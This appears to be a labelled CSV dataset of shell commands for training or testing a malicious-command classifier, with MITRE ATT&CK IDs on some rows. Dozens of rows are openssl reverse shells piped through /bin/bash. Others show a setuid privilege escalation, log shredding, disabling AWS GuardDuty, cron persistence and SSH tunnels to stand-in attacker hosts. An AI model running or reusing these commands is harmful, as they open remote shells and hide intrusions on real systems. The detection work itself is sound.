command,label,original_label,mitre_id
openssl s_client -quiet -connect 192.168.1.254:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8443,Malicious,Synthetic,Synthetic
tcpdump -i ens33 port 6379,Context_Dependent,Synthetic,Synthetic
sudo rc-update [-a|--all] [del|delete] service_name,Benign,Benign,Benign
"Resolve-Path -Path ""\\hostname\path\to\file""",Benign,Benign,Benign
"$sheet.Cells.Item(17,1) = ""=FWRITELN(A5, `""oStream.Close`"")""",Malicious,Malicious,T1204
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:9090,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:53,Malicious,Synthetic,Synthetic
twurl alias alias_name resource,Benign,Benign,Benign
lzop [-9|--best] path/to/file,Benign,Benign,Benign
tree --help,Benign,Benign,Benign
steamos-chroot [-d|--disk] /dev/sdX [-p|--partset] A|B,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.5:110 user@192.168.1.254,Context_Dependent,Synthetic,Synthetic
tcpdump -i eth0 dst 192.168.0.5,Context_Dependent,Synthetic,Synthetic
c99 file.c file.o,Benign,Benign,Benign
robo list,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4444,Malicious,Synthetic,Synthetic
"ls -p | grep -v / | xargs md5sum | awk '{print $2,$1}'",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:9001,Malicious,Synthetic,Synthetic
grype image:tag --only-fixed,Benign,Benign,Benign
debchange [-n|--nmu],Benign,Benign,Benign
tasklist /v,Context_Dependent,Malicious,T1057
systemd-tty-ask-password-agent --watch,Benign,Benign,Benign
ahost -d example.com,Benign,Benign,Benign
"su --session-command=""${OBJECTDB_HOME}/bin/objectdb.sh start"" $JAVA_USER",Benign,Benign,Benign
yadm clone remote_repository_location -b branch,Benign,Benign,Benign
tofu output,Benign,Benign,Benign
"find ""$source_dir"" -name ""*.$input_file_type"" -print0",Benign,Benign,Benign
squirrel.exe --update {REMOTEURL},Malicious,Malicious,T1218
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:4445,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:192.168.1.1:110 postgres@10.0.0.100,Context_Dependent,Synthetic,Synthetic
"qr ""data""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:8081,Malicious,Synthetic,Synthetic
git restore path/to/file,Benign,Benign,Benign
su [-h|--help],Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.10:8888 deploy@update.bad,Context_Dependent,Synthetic,Synthetic
ppmtoacad -8 path/to/file.ppm > path/to/file.dxb,Benign,Benign,Benign
"while :; do continue; echo ""This will never be reached""; done",Benign,Benign,Benign
plutil -p file1.plist file2.plist ...,Benign,Benign,Benign
loc,Benign,Benign,Benign
tunnel download table_name path/to/file;,Benign,Benign,Benign
chmod u+s /usr/bin/find,Malicious,Synthetic,Synthetic
toybox --version,Benign,Benign,Benign
gem install gem_name [-v|--version] 1.0.0,Benign,Benign,Benign
repo-add path/to/database.db.tar.gz package1.pkg.tar.zst package2.pkg.tar.zst ...,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.25:110 operator@10.20.30.40,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:9002,Malicious,Synthetic,Synthetic
x tping [-m|--heatmap] host,Benign,Benign,Benign
tcpdump -i ens33 port 445,Context_Dependent,Synthetic,Synthetic
dumpcap [-i|--interface] 1 -w path/to/output_file.pcapng,Benign,Benign,Benign
"if [ -d /etc/init.d ]; then ls -l /etc/init.d; else echo ""/etc/init.d not present on this system""; fi",Context_Dependent,Malicious,T1007
openssl s_client -quiet -connect 192.168.1.10:5432 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
"recsel [-p|--print] name,version data.rec",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:1433,Malicious,Synthetic,Synthetic
DLLRegisterServer,Malicious,Malicious,T1218
shfmt [-i|--indent] 4 path/to/file,Benign,Benign,Benign
"finger -s | awk '{printf(""%s %s\n"", $1, $2);}'",Context_Dependent,Benign,Benign
dolt status,Benign,Benign,Benign
echo Hello world | od -t x1 -t c,Benign,Benign,Benign
find /apps -group accts -print,Benign,Benign,Benign
git status [-sb|--short --branch],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:995,Malicious,Synthetic,Synthetic
sc_wartsfilter -i path/to/input.warts -o path/to/output.warts -a 2001:db8::/32,Benign,Benign,Benign
tree -a -C,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
cat /etc/*release | uniq,Context_Dependent,Malicious,T1082
idnits --verbose path/to/file.txt,Benign,Benign,Benign
tcpdump -i eth0 -w /tmp/.sync,Context_Dependent,Synthetic,Synthetic
ipcmk [-M|--shmem] segment_size_in_bytes,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:9002,Malicious,Synthetic,Synthetic
tldr transmission-create,Benign,Benign,Benign
Get{Extension/Filter}Version,Malicious,Malicious,T1505
mcookie [-f|--file] path/to/file,Benign,Benign,Benign
ip address dhcp,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
minikube start --driver virtualbox,Benign,Benign,Benign
tcpdump -i enp0s3 port 80,Context_Dependent,Synthetic,Synthetic
duc ls [-Fg|--classify --graph] [-R|--recursive] /usr/local,Benign,Benign,Benign
cake cache clear_all,Benign,Benign,Benign
systemctl list-timers --all,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
2to3 [-o|--output-dir] path/to/python3_directory [-W|--write-unchanged-files] [-n|--nobackups] path/to/python2_directory,Benign,Benign,Benign
ping -b 10.10.0.255,Benign,Benign,Benign
homeshick generate castle_name,Benign,Benign,Benign
find / -user root -perm -4000 -exec ls -l {} \;,Context_Dependent,Synthetic,Synthetic
node app.js,Benign,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:4444,Malicious,Synthetic,Synthetic
yay package_name|search_term,Benign,Benign,Benign
croc send [-c|--code] passphrase path/to/file_or_directory,Benign,Benign,Benign
freeze path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:53,Malicious,Synthetic,Synthetic
sshuttle -r audit@10.10.10.25 0/0,Context_Dependent,Synthetic,Synthetic
truss -p pid,Benign,Benign,Benign
WSearch,Malicious,Malicious,T1543
"find . \( -name '*.pdf' -or -name '*.PDF' \) -execdir sh -c 'mv -v ""$1"" ""$(echo ""$1"" | tr "" "" ""_"" | tr -d ""{()},\!'\''"" | tr ""A-Z"" ""a-z"" | sed ""s/_-_/_/g"")""' _ {} \;",Benign,Benign,Benign
ctest --output-on-failure [-R|--tests-regex] '^test_name$',Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8080,Malicious,Synthetic,Synthetic
"speak-ng ""text""",Benign,Benign,Benign
scrapy view url,Benign,Benign,Benign
paste /path/to/input-file,Context_Dependent,Malicious,T1005
ssh -fN -L 8080:172.16.5.20:8080 admin@malware.site,Context_Dependent,Synthetic,Synthetic
vcsh write-gitignore repository_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9090 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:8081,Malicious,Synthetic,Synthetic
bfs path/to/directory -path '**/path/**/*.ext' -or -name '*pattern*',Benign,Benign,Benign
awk 'FNR==NR { for(i=2;i<=NF;i++) a[$1][i]=$i; next } { for(j=2;j<=NF;j++) $j-=a[$1][j] }1' File2 File1 | rev | column -t | rev,Benign,Benign,Benign
ppmtompeg [-fr|-frames] first_frame last_frame path/to/parameter_file,Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.50:8888 audit@example.com,Context_Dependent,Synthetic,Synthetic
"dash -c ""echo 'dash is executed'""",Benign,Benign,Benign
"ping -c4 www.google.com | awk '/---/,0'",Benign,Benign,Benign
wdiff [-s|--statistics] path/to/file1 path/to/file2,Benign,Benign,Benign
starship print-config,Benign,Benign,Benign
sshuttle -r root@172.16.0.25 10.0.0.0/24,Context_Dependent,Synthetic,Synthetic
find ./cms/djangoapps/contentstore/views -iname *.css | xargs sed -i s/[Ee][Dd][Xx]/gurukul/g,Benign,Benign,Benign
konsave [-e|--export-profile] profile_name,Benign,Benign,Benign
HKLM\SOFTWARE\Plus,Malicious,Malicious,T1027
go run path/to/file.go,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8443 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:9002,Malicious,Synthetic,Synthetic
tcpdump -i ens160 port 80,Context_Dependent,Synthetic,Synthetic
nslookup -type=mx google.com,Benign,Synthetic,Synthetic
readpe --imports path/to/executable,Benign,Benign,Benign
find -L /usr/ports/packages -type l -exec rm -- {} +,Benign,Benign,Benign
newrole [-l|--level] s0-s0:c0.c1023,Benign,Benign,Benign
pdfgrep [-m|--max-count] 3 [-i|--ignore-case] '^file_name' file.pdf,Benign,Benign,Benign
udisksctl power-off [-b|--block-device] /dev/sdX,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9001,Malicious,Synthetic,Synthetic
curl file:///path/to/temp-file -o /path/to/output-file,Malicious,Malicious,T1222
dbx configure --profile DEFAULT,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.1:80 backup@172.20.10.8,Context_Dependent,Synthetic,Synthetic
hsd-cli info,Benign,Benign,Benign
ppmcie -red|green|blue xpos ypos > path/to/output.ppm,Benign,Benign,Benign
"find . -name ""*.trc"" -ctime +3 -exec rm -f {} \;",Benign,Benign,Benign
mocha [-R|--reporter] reporter,Benign,Benign,Benign
"Write-Host ""[i] Base IP-Address for Subnet: $ipAddr""",Context_Dependent,Malicious,T1046
tcpdump -i eth0 -c 4444,Context_Dependent,Synthetic,Synthetic
mcfly help subcommand,Benign,Benign,Benign
ark [-b|--batch] [-o|--destination] path/to/directory path/to/archive,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:995,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:110,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.100:53 user@192.168.1.100,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:995,Malicious,Synthetic,Synthetic
nx build project,Benign,Benign,Benign
uv sync --dry-run,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:5432 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:3389,Malicious,Synthetic,Synthetic
emacs +line_number path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:9090,Malicious,Synthetic,Synthetic
OpenProcessToken,Malicious,Malicious,T1134
ngs path/to/script.ngs,Benign,Benign,Benign
theHarvester --domain domain_name --source google --limit 200,Benign,Benign,Benign
"mdfind ""query""",Benign,Benign,Benign
echo $j | read k,Benign,Benign,Benign
"sudo find /var/log -name ""$system_log_name2*"" -exec shred -u -z -n 3 {} \; #using ""shred"" execution",Malicious,Malicious,T1070
colima start --runtime containerd,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:22,Malicious,Synthetic,Synthetic
fpsync -v -n 8 -E /path/to/source/ /path/to/destination/,Benign,Benign,Benign
IPXNET startserver 19900,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:3306 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:4445,Malicious,Synthetic,Synthetic
"find / -user edwarda -exec rm ""{}"" \;",Benign,Benign,Benign
ots new -x number_of_hoursh,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:995 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
replace path\to\file_or_directory path\to\destination_directory,Benign,Benign,Benign
Get-Command -Type Alias|Cmdlet|Function,Benign,Benign,Benign
"skate delete ""key""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:6379,Malicious,Synthetic,Synthetic
crond -p,Benign,Benign,Benign
ybacklight Sc/Sm,Benign,Benign,Benign
tcpdump -i eth0 dst 192.168.1.1,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:3389 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
bun pm pack --gzip-level 5,Benign,Benign,Benign
pstopnm -dpi n path/to/file.ps,Benign,Benign,Benign
secret-tool lookup key key,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:995,Malicious,Synthetic,Synthetic
cat *.txt | tail -n +1001 | split --lines=1000,Benign,Benign,Benign
transcrypt,Benign,Benign,Benign
igfxem.exe,Malicious,Malicious,T1574
sudo semanage interface [-d|--delete] interface_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
sdelete -z 2,Benign,Benign,Benign
golangci-lint run,Benign,Benign,Benign
jj git push [-r|--revisions] revset,Benign,Benign,Benign
carbon-now [-e|--end] line path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4444,Malicious,Synthetic,Synthetic
"for dir in $(find -depth -type d); do [[ ! $prev =~ $dir ]] && echo ""$dir"" ; prev=""$dir""; done",Benign,Benign,Benign
dnf module install package_name:stream,Benign,Benign,Benign
"find ""/tmp/2/"" -iname ""$j.sh"" -exec cp {} ""$i"" \;",Benign,Benign,Benign
adb install -r path/to/file.apk,Benign,Benign,Benign
bear --output path/to/compile_commands.json -- make,Benign,Benign,Benign
pacstrap path/to/new_root base linux linux-firmware,Benign,Benign,Benign
nagios3 -v,Benign,Benign,Benign
"trap 'echo ""Caught signal SIGHUP""' HUP",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:8081,Malicious,Synthetic,Synthetic
"exiftool ""-gps*="" path/to/image1 path/to/image2 ...",Benign,Benign,Benign
"echo ""$command"" > /etc/cron.d/$cron_script_name",Malicious,Malicious,T1053
driverquery /v,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:8081,Malicious,Synthetic,Synthetic
pyats shell --testbed-file path/to/testbed.yaml,Benign,Benign,Benign
dirname $(mktemp -u -t tmp.XXXXXXXXXX),Benign,Benign,Benign
find /home -xdev -samefile file1,Context_Dependent,Benign,Benign
aws batch create-compute-environment --compute-environment-name compute_environment_name --type type,Benign,Benign,Benign
git p4 submit,Benign,Benign,Benign
plasma-apply-colorscheme --list-schemes,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.100:5432 root@10.20.30.40,Context_Dependent,Synthetic,Synthetic
virt-sparsify --compress path/to/image.qcow2 path/to/new_image.qcow2,Benign,Benign,Benign
help2man executable [-n|--name] name,Benign,Benign,Benign
idevicebackup2 restore path/to/directory,Benign,Benign,Benign
pg_isready [-q|--quiet],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
sfdk emulator install name,Benign,Benign,Benign
gofmt -s -w source.go,Benign,Benign,Benign
browser-sync start --server --files 'path/to/directory/*.css',Benign,Benign,Benign
find /dev/sd*[a-z] | wc -l,Benign,Benign,Benign
"find . -printf ""%P\n"" | sort | while IFS= read -r f; do echo ""$(uuid) $f""; done",Benign,Benign,Benign
hlint path/to/file --refactor,Benign,Benign,Benign
sed -i s/'dummyvalue'/$(hostname -I | head -n1 | awk '{print $1;}')/g filename,Benign,Benign,Benign
aws guardduty delete-detector --detector-id $detectorId,Malicious,Malicious,T1562
bioradtopgm [-v|-version],Benign,Benign,Benign
byzanz-record --delay 10 path/to/file.[byzanz|flv|gif|ogg|ogv|webm],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:6379,Malicious,Synthetic,Synthetic
"elasticsearch-croneval ""cron_expression""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:4445,Malicious,Synthetic,Synthetic
koji build [-h|--help],Benign,Benign,Benign
"echo -e 'y\n'|ssh-keygen -q -t rsa -N """" -f ~/.ssh/id_rsa",Benign,Benign,Benign
busctl get-property service path/to/object interface_name property_name,Benign,Benign,Benign
